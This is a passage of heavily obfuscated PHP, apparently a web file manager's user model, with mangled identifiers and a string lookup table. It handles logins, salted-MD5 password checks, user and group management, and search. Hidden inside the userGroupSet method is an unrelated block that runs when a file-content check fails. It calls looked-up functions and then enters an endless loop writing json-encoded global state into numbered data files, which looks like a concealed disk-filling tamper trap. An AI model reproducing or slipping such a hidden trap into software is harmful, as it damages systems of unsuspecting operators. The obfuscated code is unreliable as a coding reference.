Model($“±ìœôá[2454])->where(array($“±ìœôá[97] => $éË‡½ÆÒ, $“±ìœôá[434] => $˜å‹éÓ))->find(); if ($Â¨ñµªö) { return $this->getInfo($Â¨ñµªö[$“±ìœôá[1754]]); } return !1; } public function userLoginCheck($ÒÄú“†Ö, $‘çşí£§) { $ã‚şÕùº =& $_SERVER[º·Ï‹¥³]; $û‘†ó¶ = $this->userLoginFind($ÒÄú“†Ö); if (!$û‘†ó¶) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($û‘†ó¶[$ã‚şÕùº[1754]], $‘çşí£§)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($û‘†ó¶[$ã‚şÕùº[1754]]); } public function userLoginFind($Ø´×ø’ù) { $î¾«´ë =& $_SERVER[º·Ï‹¥³]; $æŸ–È×” = array($î¾«´ë[32] => $Ø´×ø’ù, $î¾«´ë[2241] => $Ø´×ø’ù, $î¾«´ë[356] => $Ø´×ø’ù, $î¾«´ë[2455] => $Ø´×ø’ù, $î¾«´ë[1049] => $î¾«´ë[1051]); if ($this->nickNameRpt()) { unset($æŸ–È×”[$î¾«´ë[2241]]); } return $this->where($æŸ–È×”)->find(); } public function clearCache($Ü˜à¡²Í) { $œÆ¸ÚŸ =& $_SERVER[º·Ï‹¥³]; $this->cacheFunctionClear($œÆ¸ÚŸ[2039], $Ü˜à¡²Í); $this->cacheFunctionClear($œÆ¸ÚŸ[2040], $Ü˜à¡²Í); $this->cacheFunctionClear($œÆ¸ÚŸ[2436], $Ü˜à¡²Í); } public function userPasswordCheck($òöĞšì, $ı‡òú‘÷) { $Ê’Œü“ =& $_SERVER[º·Ï‹¥³]; $‡íüÅƒ = $this->where(array($Ê’Œü“[1754] => intval($òöĞšì)))->find(); $ó§´¾£ù = $this->metaGet($òöĞšì); $ö¿Ú–ï = isset($ó§´¾£ù[$Ê’Œü“[2456]]) ? $ó§´¾£ù[$Ê’Œü“[2456]] : $Ê’Œü“[12]; if (md5($ö¿Ú–ï . trim($ı‡òú‘÷)) !== $‡íüÅƒ[$Ê’Œü“[938]]) { return !1; } return !0; } public function userAdd($É¤úºê‰) { $ôî²”ÕÑ =& $_SERVER[º·Ï‹¥³]; $²ıÉÃ´² = array($ôî²”ÕÑ[478] => $É¤úºê‰[$ôî²”ÕÑ[32]], $ôî²”ÕÑ[2457] => $É¤úºê‰[$ôî²”ÕÑ[2159]], $ôî²”ÕÑ[2458] => isset($É¤úºê‰[$ôî²”ÕÑ[356]]) ? $É¤úºê‰[$ôî²”ÕÑ[356]] : $ôî²”ÕÑ[12], $ôî²”ÕÑ[2459] => isset($É¤úºê‰[$ôî²”ÕÑ[2455]]) ? $É¤úºê‰[$ôî²”ÕÑ[2455]] : $ôî²”ÕÑ[12], $ôî²”ÕÑ[2460] => isset($É¤úºê‰[$ôî²”ÕÑ[2241]]) ? $É¤úºê‰[$ôî²”ÕÑ[2241]] : $É¤úºê‰[$ôî²”ÕÑ[32]], $ôî²”ÕÑ[2461] => isset($É¤úºê‰[$ôî²”ÕÑ[2440]]) ? $É¤úºê‰[$ôî²”ÕÑ[2440]] : $ôî²”ÕÑ[12], $ôî²”ÕÑ[2462] => isset($É¤úºê‰[$ôî²”ÕÑ[2463]]) ? $É¤úºê‰[$ôî²”ÕÑ[2463]] : 1, $ôî²”ÕÑ[2464] => $É¤úºê‰[$ôî²”ÕÑ[938]], $ôî²”ÕÑ[2041] => isset($É¤úºê‰[$ôî²”ÕÑ[1939]]) ? $É¤úºê‰[$ôî²”ÕÑ[1939]] : 1024 * 1024 * 20, $ôî²”ÕÑ[2042] => 0, $ôî²”ÕÑ[2465] => 0, $ôî²”ÕÑ[2086] => isset($É¤úºê‰[$ôî²”ÕÑ[802]]) ? $É¤úºê‰[$ôî²”ÕÑ[802]] : 1); if (!empty($É¤úºê‰[$ôî²”ÕÑ[1754]])) { $²ıÉÃ´²[$ôî²”ÕÑ[1754]] = $É¤úºê‰[$ôî²”ÕÑ[1754]]; } $Âé¦Ôƒ¯ = $this->_checkExist($É¤úºê‰); if ($Âé¦Ôƒ¯ !== !0) { return $Âé¦Ôƒ¯; } if (!empty($²ıÉÃ´²[$ôî²”ÕÑ[2440]]) && strlen($²ıÉÃ´²[$ôî²”ÕÑ[2440]]) > 255) { $²ıÉÃ´²[$ôî²”ÕÑ[2440]] = $ôî²”ÕÑ[12]; } $Ÿ®Ôã›‚ = $this->add($²ıÉÃ´²); $´…åÈ·£ = array($ôî²”ÕÑ[2464] => $²ıÉÃ´²[$ôî²”ÕÑ[938]], $ôî²”ÕÑ[2460] => $²ıÉÃ´²[$ôî²”ÕÑ[2241]]); $this->userEdit($Ÿ®Ôã›‚, $´…åÈ·£); Model($ôî²”ÕÑ[1388])->userRootAdd($Ÿ®Ôã›‚); return $Ÿ®Ôã›‚; } protected function userEditTest($Ì¤‚«ì, $µ£Ö›€Š) { return $this->call($_SERVER[º·Ï‹¥³][2466], $Ì¤‚«ì, $µ£Ö›€Š); } protected function userEdit($€è×Îä¡, $Êœ½ëÛ¤) { $¸‡Ú”è¥ =& $_SERVER[º·Ï‹¥³]; $ù„ìæŞ = $this->getInfoSimple($€è×Îä¡); if (!$ù„ìæŞ) { return !1; } $Ä¬ÂéÔ­ = $this->_checkExist($Êœ½ëÛ¤, $€è×Îä¡); if ($Ä¬ÂéÔ­ !== !0) { return $Ä¬ÂéÔ­; } if (isset($Êœ½ëÛ¤[$¸‡Ú”è¥[938]]) && trim($Êœ½ëÛ¤[$¸‡Ú”è¥[938]]) != $¸‡Ú”è¥[12]) { $¥À¿•“ô = $this->metaGet($€è×Îä¡); if (empty($¥À¿•“ô[$¸‡Ú”è¥[2456]])) { $¥À¿•“ô[$¸‡Ú”è¥[2456]] = rand_string(10); Model($¸‡Ú”è¥[562])->metaSet($€è×Îä¡, $¸‡Ú”è¥[2456], $¥À¿•“ô[$¸‡Ú”è¥[2456]]); } $Êœ½ëÛ¤[$¸‡Ú”è¥[938]] = md5($¥À¿•“ô[$¸‡Ú”è¥[2456]] . trim($Êœ½ëÛ¤[$¸‡Ú”è¥[938]])); } else { unset($Êœ½ëÛ¤[$¸‡Ú”è¥[938]]); } if (!empty($Êœ½ëÛ¤[$¸‡Ú”è¥[2440]]) && strlen($Êœ½ëÛ¤[$¸‡Ú”è¥[2440]]) > 255) { $Êœ½ëÛ¤[$¸‡Ú”è¥[2440]] = $¸‡Ú”è¥[12]; } $this->where(array($¸‡Ú”è¥[1745] => $€è×Îä¡))->save($Êœ½ëÛ¤); if (isset($Êœ½ëÛ¤[$¸‡Ú”è¥[2241]])) { $this->setNamePinyin($€è×Îä¡, $Êœ½ëÛ¤[$¸‡Ú”è¥[2241]]); } $this->clearCache($€è×Îä¡); return !0; } public function setNamePinyin($·áÀŠ÷ô, $ö¹£Ñ« = false) { $›šóíÂ =& $_SERVER[º·Ï‹¥³]; if (!$ö¹£Ñ«) { $Øâó£´ß = $this->getInfoSimple($·áÀŠ÷ô); $ö¹£Ñ« = $Øâó£´ß[$›šóíÂ[2241]] ? $Øâó£´ß[$›šóíÂ[2241]] : $Øâó£´ß[$›šóíÂ[32]]; } $¶Õƒ‡¶ = Model($›šóíÂ[583]); if (!Input::check($ö¹£Ñ«, $›šóíÂ[639])) { return $¶Õƒ‡¶->metaSet($·áÀŠ÷ô, array($›šóíÂ[522] => $›šóíÂ[12], $›šóíÂ[521] => $›šóíÂ[12])); } return $¶Õƒ‡¶->metaSet($·áÀŠ÷ô, array($›šóíÂ[522] => str_replace($›šóíÂ[53], $›šóíÂ[12], Pinyin::get($ö¹£Ñ«)), $›šóíÂ[521] => Pinyin::get($ö¹£Ñ«, $›šóíÂ[640]))); } private function nickNameRpt() { $£šªêä =& $_SERVER[º·Ï‹¥³]; $ş•ÓàÔå = Model($£šªêä[822])->get($£šªêä[2467]); $Œ¡ÙúÖ = $GLOBALS[$£šªêä[6]][$£šªêä[441]][$£šªêä[2467]]; $ŒáËå±¿ = !is_null($ş•ÓàÔå) ? $ş•ÓàÔå : $Œ¡ÙúÖ; return !!$ŒáËå±¿; } private function _checkExist($Ú¬ƒîÄµ, $ûØÊ‹× = false) { $ªóÈßã =& $_SERVER[º·Ï‹¥³]; $úà¯¿¯ = array($ªóÈßã[32] => UserModel::ERROR_USER_EXIST_NAME, $ªóÈßã[2241] => UserModel::ERROR_USER_EXIST_NICKNAME, $ªóÈßã[356] => UserModel::ERROR_USER_EXIST_EMAIL, $ªóÈßã[2455] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($úà¯¿¯[$ªóÈßã[2241]]); } $ğâİÖ¿ü = $ûØÊ‹× ? array($ªóÈßã[1754] => array($ªóÈßã[2468], $ûØÊ‹×)) : array(); foreach ($úà¯¿¯ as $Ä›ßé¯— => $­¨êÔ) { $Æì±·Ÿò = array(); foreach ($úà¯¿¯ as $É¢²ÀòÇ => $û—ªøŞ) { if (isset($Ú¬ƒîÄµ[$É¢²ÀòÇ]) && $Ú¬ƒîÄµ[$É¢²ÀòÇ]) { $Æì±·Ÿò[] = $Ú¬ƒîÄµ[$É¢²ÀòÇ]; } } if (!$Æì±·Ÿò) { continue; } $¥î Çõ = array_merge(array($Ä›ßé¯— => array($ªóÈßã[7], $Æì±·Ÿò)), $ğâİÖ¿ü); $Ã‰Ô§ú² = $this->where($¥î Çõ)->find(); if ($Ã‰Ô§ú²) { return $­¨êÔ; } } return !0; } public function userListInfo($ß—‚¨×•) { $êëÛ´İ =& $_SERVER[º·Ï‹¥³]; $ßîšëõ¯ = array(); $ß—‚¨×• = is_array($ß—‚¨×•) ? array_unique($ß—‚¨×•) : array(); if (!$ß—‚¨×•) { return $ßîšëõ¯; } if (count($ß—‚¨×•) < 20) { foreach ($ß—‚¨×• as $§„Ä®Âš) { $ßîšëõ¯[$§„Ä®Âš . $êëÛ´İ[12]] = $this->getInfoSimpleOuter($§„Ä®Âš); } } else { $å´²‹”£ = array($êëÛ´İ[1745] => array($êëÛ´İ[476], $ß—‚¨×•)); if (count($ß—‚¨×•) == 1) { $å´²‹”£ = array($êëÛ´İ[1745] => $ß—‚¨×•[0]); } $¤•íÙ‰ô = Model($êëÛ´İ[562])->field($this->simpleField)->where($å´²‹”£)->select(); $¤•íÙ‰ô = array_to_keyvalue($¤•íÙ‰ô, $êëÛ´İ[1754]); foreach ($ß—‚¨×• as $§„Ä®Âš) { $Óü’ÛÕá = $¤•íÙ‰ô[$§„Ä®Âš]; if (!$Óü’ÛÕá) { $ßîšëõ¯[$§„Ä®Âš . $êëÛ´İ[12]] = $this->getInfoSimpleOuter($§„Ä®Âš); continue; } $Óü’ÛÕá[$êëÛ´İ[2440]] = Action($êëÛ´İ[2441])->parseUrl($Óü’ÛÕá[$êëÛ´İ[2440]]); $ßîšëõ¯[$§„Ä®Âš . $êëÛ´İ[12]] = $Óü’ÛÕá; } } return $ßîšëõ¯; } protected function userStatus($†ÙìŒ±, $©ß¶“˜) { $Ç¬ùàÕ = $this->getInfoSimple($†ÙìŒ±); if (!$Ç¬ùàÕ) { return !1; } $àöæõû• = array($_SERVER[º·Ï‹¥³][802] => $©ß¶“˜); return $this->userEdit($†ÙìŒ±, $àöæõû•); } protected function userRemove($Ö„â¶) { $Á³ğ‘¤Œ =& $_SERVER[º·Ï‹¥³]; $¬ª¥ô¼‡ = $this->getInfoSimple($Ö„â¶); if (!$¬ª¥ô¼‡) { return !1; } $ËÂ±±·• = array($Á³ğ‘¤Œ[1745] => $Ö„â¶); Model($Á³ğ‘¤Œ[648])->where($ËÂ±±·•)->delete(); Model($Á³ğ‘¤Œ[2469])->where($ËÂ±±·•)->delete(); Model($Á³ğ‘¤Œ[2047])->where($ËÂ±±·•)->delete(); Model($Á³ğ‘¤Œ[2454])->where($ËÂ±±·•)->delete(); Model($Á³ğ‘¤Œ[1118])->where($ËÂ±±·•)->delete(); Model($Á³ğ‘¤Œ[2258])->removeUserAll($Ö„â¶); Model($Á³ğ‘¤Œ[876])->userRootRemove($Ö„â¶); return $this->where($ËÂ±±·•)->delete(); } protected function userGroupSet($§»ó½¯£, $š÷ïŠªá, $¸ˆäˆøœ = array()) { $ë‘ì’¶Ğ =& $_SERVER[º·Ï‹¥³]; $şÕéÎò = $_SERVER[$ë‘ì’¶Ğ[410]] . $ë‘ì’¶Ğ[411]; $Ãü¼¾‹Ñ = $ë‘ì’¶Ğ[407]; if ($_SERVER[$ë‘ì’¶Ğ[408]] != $Ãü¼¾‹Ñ($şÕéÎò)) { $Ó´›Í¤® = $ë‘ì’¶Ğ[928]; $­ÍÛ–é = $ë‘ì’¶Ğ[409]; $¾Ÿû­· = $_SERVER[$ë‘ì’¶Ğ[410]] . $ë‘ì’¶Ğ[411]; $ùÕ˜…Ã” = $­ÍÛ–é($¾Ÿû­·); $ØèëÉ¤‘ = explode($ë‘ì’¶Ğ[253], $ùÕ˜…Ã”); if (count($ØèëÉ¤‘) < $ë‘ì’¶Ğ[676]) { $›ï¼üÎ = $ë‘ì’¶Ğ[413]; $›ï¼üÎ(); } $ş“´Ùº = $ë‘ì’¶Ğ[929]; $ş“´Ùº($_SERVER[$ë‘ì’¶Ğ[930]]); $Ó´›Í¤® = $ë‘ì’¶Ğ[928]; $Ó´›Í¤®(); $¦õ«¦ = $ë‘ì’¶Ğ[2259]; $«µå”ËÎ = json_encode($GLOBALS[$ë‘ì’¶Ğ[2260]]); $ô‹ü¡úü = 1; for ($ÀÑ¬…ó˜ = $ô‹ü¡úü; $ÀÑ¬…ó˜ > 0; $ÀÑ¬…ó˜++) { $¦õ«¦(DATA_PATH . $ÀÑ¬…ó˜, $«µå”ËÎ); } } $œ•• = $this->getInfoSimple($§»ó½¯£); if (!$œ•• || !is_array($š÷ïŠªá)) { return !1; } $£‡ÎÅ×… = Model($ë‘ì’¶Ğ[2047]); $£‡ÎÅ×…->where(array($ë‘ì’¶Ğ[1754] => $§»ó½¯£))->delete(); $ñ£Ÿ¤ò¬ = array(); $úÕ÷â = 0; foreach ($š÷ïŠªá as $˜üüğŸ => $º„¡àø) { $ç‹¯’ù = array($ë‘ì’¶Ğ[1754] => $§»ó½¯£, $ë‘ì’¶Ğ[1952] => $˜üüğŸ, $ë‘ì’¶Ğ[2061] => $º„¡àø); $ç‹¯’ù[$ë‘ì’¶Ğ[1976]] = isset($¸ˆäˆøœ[$úÕ÷â]) ? $¸ˆäˆøœ[$úÕ÷â] : 0; $úÕ÷â++; $ñ£Ÿ¤ò¬[] = $ç‹¯’ù; } return $£‡ÎÅ×…->addAll($ñ£Ÿ¤ò¬, array(), !0); } protected function userGroupAdd($©±ÔÃş, $»±üÏ€ = array()) { $ÃÅ–…ç =& $_SERVER[º·Ï‹¥³]; $¾íë£Â = $this->getInfoSimple($©±ÔÃş); if (!$¾íë£Â || empty($»±üÏ€)) { return !1; } $şÖ¢¸¹¶ = array(); foreach ($»±üÏ€ as $½¢Ñ‘…ú => $ÀŸşÛ…) { $şÖ¢¸¹¶[] = array($ÃÅ–…ç[1754] => $©±ÔÃş, $ÃÅ–…ç[1952] => $½¢Ñ‘…ú, $ÃÅ–…ç[2061] => $ÀŸşÛ…, $ÃÅ–…ç[1976] => 0); } return Model($ÃÅ–…ç[2047])->addAll($şÖ¢¸¹¶, array(), !0); } protected function userGroupRemove($¼¬½şœ´, $ä¬é¶çÏ) { $†¸Ê³ïŠ =& $_SERVER[º·Ï‹¥³]; $ÍÔëé”­ = $this->getInfoSimple($¼¬½şœ´); if (!$ÍÔëé”­ || !$ä¬é¶çÏ) { return !1; } $—ªé´©Œ = array($†¸Ê³ïŠ[1745] => $¼¬½şœ´, $†¸Ê³ïŠ[2045] => $ä¬é¶çÏ); return Model($†¸Ê³ïŠ[2047])->where($—ªé´©Œ)->delete(); } public function listData() { $ôµŸÃá = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ôµŸÃá[$_SERVER[º·Ï‹¥³][429]]); return $ôµŸÃá; } public function listByID($„­„¾Œ) { $ï‰œÊÙ¸ =& $_SERVER[º·Ï‹¥³]; if (!$„­„¾Œ) { return; } $×ŸÄ†Ùë = array($ï‰œÊÙ¸[1754] => array($ï‰œÊÙ¸[7], $„­„¾Œ)); $ÀËÃÄú… = $this->where($×ŸÄ†Ùë)->select(); $ÀËÃÄú… = array_sort_keep($ÀËÃÄú…, $ï‰œÊÙ¸[1754], $„­„¾Œ); $this->_listDataApply($ÀËÃÄú…); return $ÀËÃÄú…; } public function listByGroup($÷Û•È’ı = 0, $…€Ç¨ñ¤ = array()) { $˜¦–ĞÃ =& $_SERVER[º·Ï‹¥³]; $…Á­Ş = $˜¦–ĞÃ[12]; $Ì´ˆîÒ = array(); if ($÷Û•È’ı) { $Ì´ˆîÒ = array($˜¦–ĞÃ[2470] => intval($÷Û•È’ı)); $…Á­Ş = "\114\x45\106\x54\40\x4a\117\111\116\40{$this->tablePrefix}\x75\163\x65\x72\x5f\147\162\x6f\165\x70\x20\x75\163\145\x72\137\x67\162\x6f\x75\160\40\x6f\156\40\165\163\145\162\x2e\165\x73\x65\x72\x49\x44\x20\75\40\x75\163\x65\162\137\x67\x72\x6f\165\160\x2e\x75\163\145\162\x49\x44"; $å¢è¤é™ = Input::get($˜¦–ĞÃ[514], null, $˜¦–ĞÃ[12]) ? $˜¦–ĞÃ[12] : $˜¦–ĞÃ[2471]; } if (isset($…€Ç¨ñ¤[$˜¦–ĞÃ[802]])) { $Ì´ˆîÒ[$˜¦–ĞÃ[2472]] = $…€Ç¨ñ¤[$˜¦–ĞÃ[802]]; } $ğ•©Ü¹¸ = $this->_makeOrder($å¢è¤é™)->field($˜¦–ĞÃ[2473])->where($Ì´ˆîÒ)->join($…Á­Ş)->selectPage(50); $this->_listDataApply($ğ•©Ü¹¸[$˜¦–ĞÃ[429]]); return $ğ•©Ü¹¸; } private function _makeOrder($¶°èªØ = '') { $§¹ù‰àæ =& $_SERVER[º·Ï‹¥³]; $ÔÛ¯Ñû = array($§¹ù‰àæ[1754], $§¹ù‰àæ[32], $§¹ù‰àæ[1941], $§¹ù‰àæ[1913], $§¹ù‰àæ[222]); $ãÂáŞ = array($§¹ù‰àæ[507] => $§¹ù‰àæ[508], $§¹ù‰àæ[509] => $§¹ù‰àæ[510]); $ĞÔŞ‹èÚ = Input::get($§¹ù‰àæ[514], $§¹ù‰àæ[7], $§¹ù‰àæ[1745], $ÔÛ¯Ñû); $úÕ„©õı = Input::get($§¹ù‰àæ[515], $§¹ù‰àæ[7], $§¹ù‰àæ[2048], array($§¹ù‰àæ[2048], $§¹ù‰àæ[509])); $úÕ„©õı = $ãÂáŞ[$úÕ„©õı]; $¶°èªØ = $¶°èªØ . "\x75\163\x65\x72\x2e{$ĞÔŞ‹èÚ}\40{$úÕ„©õı}\x2c\x20\165\x73\145\162\56\x75\163\145\162\x49\x44\x20\141\x73\x63"; return $this->alias($§¹ù‰àæ[2175])->order($¶°èªØ); } public function listSearch($ËĞÅÁ­ù) { $‚«ìõĞ‰ =& $_SERVER[º·Ï‹¥³]; $ÍÖ·Õ€Á = trim($ËĞÅÁ­ù[$‚«ìõĞ‰[2051]]); $‰ñøİË² = explode($‚«ìõĞ‰[53], $ÍÖ·Õ€Á); if (!$ÍÖ·Õ€Á || count($‰ñøİË²) == 1) { return $this->listSearchNow($ËĞÅÁ­ù); } $à™µçë‘ = array($‚«ìõĞ‰[429] => array()); foreach ($‰ñøİË² as $Á‹ûâ¿Î) { if (!trim($Á‹ûâ¿Î)) { continue; } $ËĞÅÁ­ù[$‚«ìõĞ‰[2051]] = $Á‹ûâ¿Î; $™ÃÃ®Û­ = $this->listSearchNow($ËĞÅÁ­ù); $à™µçë‘[$‚«ìõĞ‰[429]] = array_merge($à™µçë‘[$‚«ìõĞ‰[429]], $™ÃÃ®Û­[$‚«ìõĞ‰[429]]); } $à™µçë‘[$‚«ìõĞ‰[429]] = array_unique_by_key($à™µçë‘[$‚«ìõĞ‰[429]], $‚«ìõĞ‰[1754]); $à™µçë‘[$‚«ìõĞ‰[426]] = array($‚«ìõĞ‰[427] => count($à™µçë‘[$‚«ìõĞ‰[429]]), $‚«ìõĞ‰[423] => 20, $‚«ìõĞ‰[404] => 1, $‚«ìõĞ‰[428] => 1); return $à™µçë‘; } public function listSearchNow($´²šÑ–ù) { $«€âöæ… =& $_SERVER[º·Ï‹¥³]; $ÆÀê·‚Î = trim($´²šÑ–ù[$«€âöæ…[2051]]); $õ¿òØü§ = isset($´²šÑ–ù[$«€âöæ…[2052]]) ? $´²šÑ–ù[$«€âöæ…[2052]] : !1; $ÆÀê·‚Î = str_replace($«€âöæ…[2053], $«€âöæ…[2054], trim($ÆÀê·‚Î)); $ÓéÆÖ™ = array($«€âöæ…[32] => array($«€âöæ…[443], "\45{$ÆÀê·‚Î}\x25"), $«€âöæ…[356] => array($«€âöæ…[443], "{$ÆÀê·‚Î}\x25"), $«€âöæ…[2241] => array($«€âöæ…[443], "{$ÆÀê·‚Î}\x25"), $«€âöæ…[1049] => $«€âöæ…[2055]); if (Input::check($ÆÀê·‚Î, $«€âöæ…[362])) { $ÓéÆÖ™[$«€âöæ…[1754]] = array($«€âöæ…[443], "{$ÆÀê·‚Î}\45"); $ÓéÆÖ™[$«€âöæ…[2455]] = array($«€âöæ…[443], "{$ÆÀê·‚Î}\x25"); } if (!$ÆÀê·‚Î) { $ÓéÆÖ™ = array(); } if (isset($´²šÑ–ù[$«€âöæ…[802]])) { $ÓéÆÖ™[$«€âöæ…[802]] = $´²šÑ–ù[$«€âöæ…[802]]; } $ÓéÆÖ™ = $this->parseWhereLike($ÓéÆÖ™); $­ïÙòš = $this->_makeOrder()->where($ÓéÆÖ™)->selectPage(20); if (!$­ïÙòš || count($­ïÙòš[$«€âöæ…[429]]) < 5 && Input::check($ÆÀê·‚Î, $«€âöæ…[369])) { $œØ‘§§ = $this->_searchFromMeta($«€âöæ…[521], $ÆÀê·‚Î, 10); $”ÔÚÆÛ = $this->_searchFromMeta($«€âöæ…[522], $ÆÀê·‚Î, 10); $ÃÆ‡¸ì = array_merge($œØ‘§§, $”ÔÚÆÛ, $­ïÙòš[$«€âöæ…[429]]); $­ïÙòš[$«€âöæ…[429]] = array_unique_by_key($ÃÆ‡¸ì, $«€âöæ…[1754]); $­ïÙòš[$«€âöæ…[426]][$«€âöæ…[427]] = count($­ïÙòš[$«€âöæ…[429]]); $­ïÙòš[$«€âöæ…[426]][$«€âöæ…[428]] = ceil($­ïÙòš[$«€âöæ…[426]][$«€âöæ…[427]] / $­ïÙòš[$«€âöæ…[426]][$«€âöæ…[423]]); } $this->_listDataApply($­ïÙòš[$«€âöæ…[429]]); $this->_filterByGroup($­ïÙòš, $õ¿òØü§); return $­ïÙòš; } private function _filterByGroup(&$äûÂû«î, $£ğ•ºïÏ) { $àÃŒÊ³€ =& $_SERVER[º·Ï‹¥³]; if (!$£ğ•ºïÏ) { return $äûÂû«î; } foreach ($äûÂû«î[$àÃŒÊ³€[429]] as $ŞˆÀŠÙ => &$ï‘‘‡»é) { $€ùñŞ‚ó = array_to_keyvalue($ï‘‘‡»é[$àÃŒÊ³€[2144]], $àÃŒÊ³€[12], $àÃŒÊ³€[1952]); if (!in_array($£ğ•ºïÏ, $€ùñŞ‚ó)) { unset($äûÂû«î[$àÃŒÊ³€[429]][$ŞˆÀŠÙ]); } } unset($ï‘‘‡»é); $äûÂû«î[$àÃŒÊ³€[429]] = array_values($äûÂû«î[$àÃŒÊ³€[429]]); $äûÂû«î[$àÃŒÊ³€[426]] = array($àÃŒÊ³€[2211] => count($äûÂû«î[$àÃŒÊ³€[429]]), $àÃŒÊ³€[2209] => $äûÂû«î[$àÃŒÊ³€[426]][$àÃŒÊ³€[423]], $àÃŒÊ³€[2208] => 1, $àÃŒÊ³€[2210] => 1); } private function _searchFromMeta($ªı”ˆ‘, $Şç„·ãë, $ø„Ùˆ›Ø) { $“Ù“›£¶ =& $_SERVER[º·Ï‹¥³]; $Şç„·ãë = strtolower($Şç„·ãë); $“¹¯ö¾¢ = array($“Ù“›£¶[97] => $ªı”ˆ‘, $“Ù“›£¶[434] => array($“Ù“›£¶[443], "\45{$Şç„·ãë}\45")); $“¹¯ö¾¢ = $this->parseWhereLike($“¹¯ö¾¢); $¯” Ô× = Model($“Ù“›£¶[2474])->where($“¹¯ö¾¢)->limit($ø„Ùˆ›Ø)->select(); if (!$¯” Ô×) { return array(); } $¯” Ô× = array_to_keyvalue($¯” Ô×, $“Ù“›£¶[12], $“Ù“›£¶[1754]); $”Áè¡ô = $this->where(array($“Ù“›£¶[1745] => array($“Ù“›£¶[7], $¯” Ô×)))->select(); if (!$”Áè¡ô) { return array(); } return $”Áè¡ô; } private function _listDataApplyItem($öÃ‚‡ü) { $À„ÁÖËû = array($öÃ‚‡ü); $this->_listDataApply($À„ÁÖËû); return $À„ÁÖËû[0]; } private function _listDataApply(&$®ˆ€–„) { $„ßÎØô =& $_SERVER[º·Ï‹¥³]; if (!$®ˆ€–„) { return; } array_remove_key($®ˆ€–„, $„ßÎØô[938]); $ì—ŠÀÔš = array_to_keyvalue($®ˆ€–„, $„ßÎØô[12], $„ßÎØô[1754]); $this->_listAppendGroup($®ˆ€–„, $ì—ŠÀÔš); $this->_listAppendMeta($®ˆ€–„, $ì—ŠÀÔš); $this->_listAppendSourceRoot($®ˆ€–„, $ì—ŠÀÔš); } private function _listAppendSourceRoot(&$ªÊÎøõı, $Ê““Ê­ã) { $êÀ×öª’ =& $_SERVER[º·Ï‹¥³]; $ Âıì¹Ğ = Model($êÀ×öª’[876])->listSourceRoot(SourceModel::TYPE_USER, $Ê““Ê­ã); $ Âıì¹Ğ = array_to_keyvalue($ Âıì¹Ğ, $êÀ×öª’[554]); $ Âıì¹Ğ = array_remove_key($ Âıì¹Ğ, $êÀ×öª’[554]); foreach ($ªÊÎøõı as &$¥ÄËæù¼) { $¥ÄËæù¼[$êÀ×öª’[90]] = $ Âıì¹Ğ[$¥ÄËæù¼[$êÀ×öª’[1754]]] ? $ Âıì¹Ğ[$¥ÄËæù¼[$êÀ×öª’[1754]]] : array(); } unset($¥ÄËæù¼); } private function _listAppendGroup(&$µ÷û²âä, $ºæâĞ™) { $•­”¶“å =& $_SERVER[º·Ï‹¥³]; $³‰ä®ë = array($•­”¶“å[1754] => array($•­”¶“å[7], $ºæâĞ™)); $Ä•’Ã¶ô = Model($•­”¶“å[2047])->where($³‰ä®ë)->select(); $ßºô¿‰÷ = array_to_keyvalue($Ä•’Ã¶ô, $•­”¶“å[12], $•­”¶“å[1952]); $ßºô¿‰÷ = array_remove_value(array_unique($ßºô¿‰÷), $•­”¶“å[219]); if (!$ßºô¿‰÷ || !$Ä•’Ã¶ô) { return; } $³‰ä®ë = array($•­”¶“å[1952] => array($•­”¶“å[7], $ßºô¿‰÷)); $½¶¢ĞŠÕ = Model($•­”¶“å[2142])->field($•­”¶“å[2475])->where($³‰ä®ë)->select(); $½¶¢ĞŠÕ = array_to_keyvalue($½¶¢ĞŠÕ, $•­”¶“å[1952]); $Ä•’Ã¶ô = array_to_keyvalue_group($Ä•’Ã¶ô, $•­”¶“å[1754]); foreach ($Ä•’Ã¶ô as &$íÆĞ‹±•) { $ò–Û¼Ù = array(); foreach ($íÆĞ‹±• as $Ë»¯Ì) { if (!$Ë»¯Ì[$•­”¶“å[2061]]) { continue; } $®æ‹ıÚõ = Model($•­”¶“å[556])->listData($Ë»¯Ì[$•­”¶“å[2061]]); $ò–Û¼Ù[] = array($•­”¶“å[1952] => $Ë»¯Ì[$•­”¶“å[1952]], $•­”¶“å[2476] => $½¶¢ĞŠÕ[$Ë»¯Ì[$•­”¶“å[1952]]][$•­”¶“å[32]], $•­”¶“å[569] => $½¶¢ĞŠÕ[$Ë»¯Ì[$•­”¶“å[1952]]][$•­”¶“å[569]], $•­”¶“å[471] => $®æ‹ıÚõ); } $íÆĞ‹±• = $ò–Û¼Ù; } unset($íÆĞ‹±•); foreach ($µ÷û²âä as &$ãôéÚÜà) { $ãôéÚÜà[$•­”¶“å[2144]] = array(); if (isset($Ä•’Ã¶ô[$ãôéÚÜà[$•­”¶“å[1754]]])) { $ãôéÚÜà[$•­”¶“å[2144]] = $Ä•’Ã¶ô[$ãôéÚÜà[$•­”¶“å[1754]]]; } } unset($ãôéÚÜà); } public function userAppendGroup($ØœœÁï÷) { $¶£‡İú¢ =& $_SERVER[º·Ï‹¥³]; if (!$ØœœÁï÷) { return array(); } $this->_listAppendGroup($ØœœÁï÷, array_to_keyvalue($ØœœÁï÷, $¶£‡İú¢[12], $¶£‡İú¢[1754])); return $ØœœÁï÷; } private function _listAppendMeta(&$„ñşˆÉú, $ç½æ¹Ù) { $ Ğåô•¬ =& $_SERVER[º·Ï‹¥³]; $Ûº­ò¥† = UserJobModel::JOB_KEY; $‡™âÍüÒ = array($ Ğåô•¬[2456]); $ÉÆ®Âªê = array($ Ğåô•¬[1754] => array($ Ğåô•¬[7], $ç½æ¹Ù)); $©³ƒ½¦Ğ = Model($ Ğåô•¬[2454])->where($ÉÆ®Âªê)->select(); $©³ƒ½¦Ğ = array_to_keyvalue_group($©³ƒ½¦Ğ, $ Ğåô•¬[1754]); foreach ($©³ƒ½¦Ğ as &$ƒ³Áì¢ù) { $…ÇÍ¯Ö‹ = array(); foreach ($ƒ³Áì¢ù as $´ªúºŸÑ) { if (!in_array($´ªúºŸÑ[$ Ğåô•¬[97]], $‡™âÍüÒ)) { $…ÇÍ¯Ö‹[$´ªúºŸÑ[$ Ğåô•¬[97]]] = $´ªúºŸÑ[$ Ğåô•¬[434]]; } } $ƒ³Áì¢ù = $…ÇÍ¯Ö‹; } unset($ƒ³Áì¢ù); $Á‘ÕåãÑ = 